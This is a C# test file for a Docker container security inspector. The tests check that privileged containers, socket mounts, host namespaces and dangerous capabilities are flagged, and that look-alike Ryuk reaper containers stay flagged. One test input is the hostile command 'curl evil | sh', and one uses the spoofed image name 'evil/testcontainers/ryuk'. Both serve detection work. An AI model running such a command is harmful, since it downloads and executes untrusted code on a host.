// SPDX-License-Identifier: EUPL-1.2
using Aetheus.Agent.Core.Collectors;

namespace Aetheus.Agent.Core.Tests;

/// <summary>PLAN-010 lot 1: reading host-escape settings from <c>docker inspect</c>. The samples are lines
/// Docker 29 printed on 2026-10-17 for <see cref="DockerContainerSecurityInspector.InspectFormat"/>
/// (mount lists shortened, ids kept).</summary>
public sealed class DockerContainerSecurityInspectorTests
{
    private const string Plain =
        """{"id":"c666a8baba74db70b2ea2f6e5d1ea42e7496062241a60e0ec8e2866d0ca98114","name":"/cool_wing","image":"postgres:18-alpine","privileged":false,"pidMode":"","networkMode":"bridge","capAdd":null,"mounts":[{"Destination":"/var/lib/postgresql","Driver":"local","Mode":"","Name":"89c7","Propagation":"","RW":true,"Source":"/var/lib/docker/volumes/89c7/_data","Type":"volume"}],"role":null,"service":null}""";

    private const string VpsSimulator =
        """{"id":"65bf96207452e8f127f90fece582aa1aabc41fdff37335d99f0d034dabc2af5d","name":"/aetheus-vpssim","image":"aetheus-vpssim-full-vpssim","privileged":true,"pidMode":"","networkMode":"aetheus-vpssim-full_default","capAdd":null,"mounts":[{"Destination":"/sys/fs/cgroup","Mode":"rw","Propagation":"rprivate","RW":true,"Source":"/sys/fs/cgroup","Type":"bind"}],"role":null,"service":"vpssim"}""";

    private const string BuildKit =
        """{"id":"0f0e5a1b2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d4e5f60718293a4b5c6d7","name":"/buildx_buildkit_aetheus-desktop-g3dn2pk0","image":"moby/buildkit:buildx-stable-1","privileged":true,"pidMode":"","networkMode":"bridge","capAdd":null,"mounts":[{"Type":"volume","Name":"buildx_buildkit_aetheus-desktop-g3dn2pk0_state","Source":"/var/lib/docker/volumes/x/_data","Destination":"/var/lib/buildkit","Driver":"local","Mode":"z","RW":true,"Propagation":""}],"role":null,"service":null}""";

    private const string SocketProbe =
        """{"id":"31949100eb91dfb2591acfebd979681503e238a920dc3f588155fb0074eae223","name":"/aetheus-plan010-sock-probe","image":"alpine:3.20","privileged":false,"pidMode":"","networkMode":"bridge","capAdd":null,"mounts":[{"Type":"bind","Source":"/var/run/docker.sock","Destination":"/var/run/docker.sock","Mode":"","RW":true,"Propagation":"rprivate"}],"role":null,"service":null}""";

    private const string HostEverything =
        """{"id":"aaaabbbbccccdddd","name":"/escape","image":"alpine:3.20","privileged":false,"pidMode":"host","networkMode":"host","capAdd":["CAP_SYS_ADMIN","NET_ADMIN","CHOWN"],"mounts":[{"Type":"bind","Source":"/run/","Destination":"/host-run"}],"role":null,"service":null}""";

    private const string Smoke =
        """{"id":"eeeeffff00001111","name":"/quirky_euler","image":"aetheus-e2e:1","privileged":false,"pidMode":"","networkMode":"host","capAdd":null,"mounts":[],"role":"browser-smoke","service":null}""";

    private static DockerContainerSecurityInspector.Finding One(string line, string? builder = null) =>
        Assert.Single(DockerContainerSecurityInspector.Parse(line, builder));

    [Fact]
    public void PlainContainer_IsInspectedAndClean()
    {
        var finding = One(Plain);
        Assert.Equal(DockerContainerRisks.None, finding.Risks);
        Assert.Equal(AetheusContainerRole.None, finding.Role);
    }

    [Fact]
    public void SocketBindMount_IsReported()
    {
        Assert.Equal(DockerContainerRisks.DockerSocket, One(SocketProbe).Risks);
    }

    [Fact]
    public void HostNamespaces_RunDirectoryMount_AndDangerousCapabilities_AreReported_WithCapPrefixRemoved()
    {
        var finding = One(HostEverything);
        Assert.Equal(
            DockerContainerRisks.HostPid | DockerContainerRisks.HostNetwork | DockerContainerRisks.DockerSocket
            | DockerContainerRisks.DangerousCapabilities,
            finding.Risks);
        Assert.Equal("NET_ADMIN,SYS_ADMIN", finding.DangerousCapabilities);
    }

    [Fact]
    public void TheAgentsOwnBuildKitBuilder_IsNamed_OnlyForItsOwnBuilderName()
    {
        var own = One(BuildKit, "aetheus-desktop-g3dn2pk");
        Assert.Equal(DockerContainerRisks.Privileged, own.Risks);
        Assert.Equal(AetheusContainerRole.BuildKitBuilder, own.Role);

        Assert.Equal(AetheusContainerRole.None, One(BuildKit, "aetheus-other").Role);
        Assert.Equal(AetheusContainerRole.None, One(BuildKit).Role);
    }

    [Fact]
    public void VpsSimulatorAndBrowserSmoke_AreNamed()
    {
        var simulator = One(VpsSimulator);
        Assert.Equal(DockerContainerRisks.Privileged, simulator.Risks);
        Assert.Equal(AetheusContainerRole.VpsSimulator, simulator.Role);
        var smoke = One(Smoke);
        Assert.Equal(DockerContainerRisks.HostNetwork, smoke.Risks);
        Assert.Equal(AetheusContainerRole.BrowserSmoke, smoke.Role);
    }

    // R-33: the Ryuk a pipeline's tests started (vps2577917, w5-candidate, 2026-10-23), as Docker prints it.
    private const string RyukCreated = "2026-10-23T20:26:01.123456789Z";

    private static string Ryuk(
        string name = "/testcontainers-ryuk-3f2b6c1e-8d4a-4b5e-9c7f-0a1b2c3d4e5f",
        string image = "testcontainers/ryuk:0.14.0",
        string testcontainers = "\"true\"",
        string capAdd = "null",
        string pidMode = "",
        string path = "\"/bin/ryuk\"",
        string args = "[]") =>
        "{\"id\":\"9a8b7c6d5e4f30211203f4e5d6c7b8a9\",\"name\":\"" + name + "\",\"image\":\"" + image + "\","
        + "\"privileged\":true,\"pidMode\":\"" + pidMode + "\",\"networkMode\":\"bridge\",\"capAdd\":" + capAdd + ","
        + "\"mounts\":[{\"Type\":\"bind\",\"Source\":\"/var/run/docker.sock\",\"Destination\":\"/var/run/docker.sock\"}],"
        + "\"created\":\"" + RyukCreated + "\",\"path\":" + path + ",\"args\":" + args + ","
        + "\"testcontainers\":" + testcontainers + ",\"role\":null,\"service\":null}";

    private static readonly DateTimeOffset RyukCreatedAt = new(2026, 10, 23, 20, 26, 1, TimeSpan.Zero);

    // The agent's task record: a pipeline task ran from 20:20 and is still running.
    private static bool DuringRun(DateTimeOffset created) =>
        created >= new DateTimeOffset(2026, 10, 23, 20, 20, 0, TimeSpan.Zero);

    private static bool NoRun(DateTimeOffset created) => false;

    [Fact]
    public void R33_RyukCreatedDuringALivePipelineTask_IsTheRunsReaper_PrivilegeAndSocketExpected()
    {
        var finding = Assert.Single(DockerContainerSecurityInspector.Parse(Ryuk(), null, DuringRun));

        Assert.Equal(AetheusContainerRole.TestcontainersReaper, finding.Role);
        Assert.Equal(DockerContainerRisks.Privileged | DockerContainerRisks.DockerSocket, finding.Risks);
        Assert.Equal(DockerContainerRisks.None, DockerContainerSecurity.UnexpectedRisks(new DockerContainerDto
        {
            Risks = finding.Risks,
            AetheusRole = finding.Role
        }));
    }

    [Fact]
    public void R33_TheCreationInstantReadFromDocker_IsWhatTheTaskRecordJudges()
    {
        DateTimeOffset? judged = null;
        DockerContainerSecurityInspector.Parse(Ryuk(), null, created => { judged = created; return true; });

        Assert.Equal(RyukCreatedAt, judged!.Value.AddTicks(-(judged.Value.Ticks % TimeSpan.TicksPerSecond)));
    }

    [Theory]
    // Outside any run: the name, image and label alone prove nothing.
    [InlineData("outside-run", "/testcontainers-ryuk-3f2b6c1e-8d4a-4b5e-9c7f-0a1b2c3d4e5f", "testcontainers/ryuk:0.14.0", "\"true\"")]
    // During a run, a look-alike image: another registry, a prefix, a suffix.
    [InlineData("run", "/testcontainers-ryuk-3f2b6c1e-8d4a-4b5e-9c7f-0a1b2c3d4e5f", "ghcr.io/testcontainers/ryuk:0.14.0", "\"true\"")]
    [InlineData("run", "/testcontainers-ryuk-3f2b6c1e-8d4a-4b5e-9c7f-0a1b2c3d4e5f", "evil/testcontainers/ryuk:0.14.0", "\"true\"")]
    [InlineData("run", "/testcontainers-ryuk-3f2b6c1e-8d4a-4b5e-9c7f-0a1b2c3d4e5f", "testcontainers/ryuk-tools:0.14.0", "\"true\"")]
    // During a run, without the Testcontainers label, or under another name.
    [InlineData("run", "/testcontainers-ryuk-3f2b6c1e-8d4a-4b5e-9c7f-0a1b2c3d4e5f", "testcontainers/ryuk:0.14.0", "null")]
    [InlineData("run", "/testcontainers-ryuk-not-a-session", "testcontainers/ryuk:0.14.0", "\"true\"")]
    [InlineData("run", "/my-ryuk", "testcontainers/ryuk:0.14.0", "\"true\"")]
    // During a run, the real image, name and label, but not Ryuk's own process: the image declares only
    // CMD ["/bin/ryuk"] and Testcontainers configures it through environment variables, never arguments.
    [InlineData("run", "/testcontainers-ryuk-3f2b6c1e-8d4a-4b5e-9c7f-0a1b2c3d4e5f", "testcontainers/ryuk:0.14.0", "\"true\"",
        "\"sh\"", "[\"-c\",\"curl evil | sh\"]")]
    [InlineData("run", "/testcontainers-ryuk-3f2b6c1e-8d4a-4b5e-9c7f-0a1b2c3d4e5f", "testcontainers/ryuk:0.14.0", "\"true\"",
        "\"/bin/sh\"", "[]")]
    [InlineData("run", "/testcontainers-ryuk-3f2b6c1e-8d4a-4b5e-9c7f-0a1b2c3d4e5f", "testcontainers/ryuk:0.14.0", "\"true\"",
        "\"/bin/ryuk\"", "[\"--anything\"]")]
    [InlineData("run", "/testcontainers-ryuk-3f2b6c1e-8d4a-4b5e-9c7f-0a1b2c3d4e5f", "testcontainers/ryuk:0.14.0", "\"true\"",
        "\"/tmp/bin/ryuk\"", "[]")]
    [InlineData("run", "/testcontainers-ryuk-3f2b6c1e-8d4a-4b5e-9c7f-0a1b2c3d4e5f", "testcontainers/ryuk:0.14.0", "\"true\"",
        "null", "null")]
    public void R33_ALookAlike_StaysFlagged(
        string window, string name, string image, string testcontainers,
        string path = "\"/bin/ryuk\"", string args = "[]")
    {
        Func<DateTimeOffset, bool> record = window == "run" ? DuringRun : NoRun;

        var finding = Assert.Single(DockerContainerSecurityInspector.Parse(
            Ryuk(name, image, testcontainers, path: path, args: args), null, record));

        Assert.Equal(AetheusContainerRole.None, finding.Role);
        Assert.Equal(DockerContainerRisks.Privileged | DockerContainerRisks.DockerSocket, finding.Risks);
    }

    [Fact]
    public void R33_WithoutTheAgentsTaskRecord_NoReaperIsRecognised()
    {
        Assert.Equal(AetheusContainerRole.None, One(Ryuk()).Role);
    }

    [Fact]
    public void R33_TheRunsReaper_StillReportsWhatItsRoleDoesNotNeed()
    {
        var finding = Assert.Single(DockerContainerSecurityInspector.Parse(
            Ryuk(capAdd: "[\"SYS_ADMIN\"]", pidMode: "host"), null, DuringRun));

        Assert.Equal(AetheusContainerRole.TestcontainersReaper, finding.Role);
        Assert.Equal(
            DockerContainerRisks.HostPid | DockerContainerRisks.DangerousCapabilities,
            DockerContainerSecurity.UnexpectedRisks(new DockerContainerDto { Risks = finding.Risks, AetheusRole = finding.Role }));
    }

    [Fact]
    public void Apply_MatchesShortIds_AndLeavesAContainerMissingFromTheAnswerUninspected()
    {
        List<DockerContainerDto> containers =
        [
            new() { ContainerId = "31949100eb91", Name = "aetheus-plan010-sock-probe" },
            new() { ContainerId = "c666a8baba74", Name = "cool_wing" },
            new() { ContainerId = "deadbeef0000", Name = "vanished" }
        ];
        // Docker answers non-zero when one container vanished, after the lines of the others.
        var output = SocketProbe + "\n" + Plain + "\nError response from daemon: No such container: deadbeef0000\n";

        var result = DockerContainerSecurityInspector.Apply(containers, output, null);

        Assert.True(result[0].SecurityInspected);
        Assert.Equal(DockerContainerRisks.DockerSocket, result[0].Risks);
        Assert.True(result[1].SecurityInspected);
        Assert.Equal(DockerContainerRisks.None, result[1].Risks);
        Assert.False(result[2].SecurityInspected);
    }

    [Fact]
    public void UnreadableLine_IsSkipped_NotReadAsClean()
    {
        Assert.Empty(DockerContainerSecurityInspector.Parse("{\"id\":\"abc\",\"privileged\":tru", null));
    }

    [Fact]
    public void Arguments_InspectContainersOnly_WithTheProjectingFormat()
    {
        var args = DockerContainerSecurityInspector.BuildArguments(["a1", "b2"]);
        Assert.Equal(["inspect", "--type", "container", "--format", DockerContainerSecurityInspector.InspectFormat, "a1", "b2"], args);
        Assert.DoesNotContain(".Config.Env", DockerContainerSecurityInspector.InspectFormat, StringComparison.Ordinal);
    }
}
